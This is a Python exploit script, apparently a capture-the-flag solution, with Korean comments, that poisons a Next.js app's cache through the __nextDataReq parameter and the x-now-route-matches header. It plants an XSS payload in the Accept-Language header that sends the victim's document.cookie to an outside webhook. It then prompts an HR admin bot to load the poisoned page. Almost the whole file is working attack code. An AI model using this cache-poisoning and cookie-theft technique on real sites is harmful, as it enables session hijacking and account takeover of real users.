import requests
import time
import random

# ==========================================
# 1. 설정 (Configuration)
# ==========================================
TARGET_HOST = "http://localhost:3000"
WEBHOOK_URL = "https://meowyeok.kr/" # 본인의 웹훅 주소

# 캐시 충돌 방지를 위한 랜덤 경로 생성
random_id = random.randint(10000, 99999)
RESUME_PATH = f"/resume?name=test{random_id}&title=test{random_id}"

print(f"[*] Starting Cache Poisoning Exploit...")
print(f"[*] Target Fresh Path: {RESUME_PATH}")

# ==========================================
# 2. XSS 페이로드 생성
# ==========================================
js_code = f"location.href='{WEBHOOK_URL}?c='+document.cookie"
xss_payload = f"<img src=x onerror={js_code}>"

print(f"\n[+] Generated XSS Payload: {xss_payload}\n")

# ==========================================
# 3. Cache Poisoning
# ==========================================
poison_url = f"{TARGET_HOST}{RESUME_PATH}&__nextDataReq=1"
headers = {
    "Accept-Language": f"ko-KR {xss_payload}",
    "x-now-route-matches": "1"
}

print(f"[*] Sending Poisoning Request...")
response = requests.get(poison_url, headers=headers)

if response.status_code == 200:
    print("[+] Cache successfully poisoned!")
else:
    print(f"[-] Something went wrong. Status Code: {response.status_code}")

# 캐시가 반영될 시간 대기
time.sleep(2)

# ==========================================
# 4. HR 관리자 봇 호출 (Exploit Trigger)
# ==========================================
apply_api_url = f"{TARGET_HOST}/api/apply"
json_data = {
    "resumePath": RESUME_PATH
}

print(f"[*] Notifying HR Admin Bot...")
bot_response = requests.post(apply_api_url, json=json_data)

if bot_response.status_code == 200:
    print("[+] HR Admin has been notified!")
    print(f"[!] Check your webhook ({WEBHOOK_URL}) for the Admin's Flag! 🚩")
else:
    print(f"[-] Failed to notify Admin Bot. Status: {bot_response.status_code}")